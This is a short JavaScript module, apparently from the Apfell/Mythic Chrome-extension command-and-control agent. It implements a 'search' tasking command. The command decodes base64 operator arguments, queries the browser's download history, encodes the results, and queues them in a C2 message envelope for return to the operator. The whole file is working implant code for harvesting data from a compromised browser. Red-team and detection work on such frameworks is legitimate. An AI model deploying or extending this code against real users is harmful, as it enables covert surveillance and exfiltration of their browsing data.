search = function(params) {
    let args = JSON.parse(atob(params['data'].toString()));
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    chrome.downloads.search(args, function(results) {
        const data = btoa(unescape(encodeURIComponent(JSON.stringify(results, null, 2))));
        const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
        let meta = {};
        meta["metatype"] = 3;
        meta["metadata"] = apfellmsg;
        const metaenvelope = JSON.stringify(meta);
        out.push(metaenvelope);
    });
};

C2.commands[search.name] = search;
COMMAND_ENDS_HERE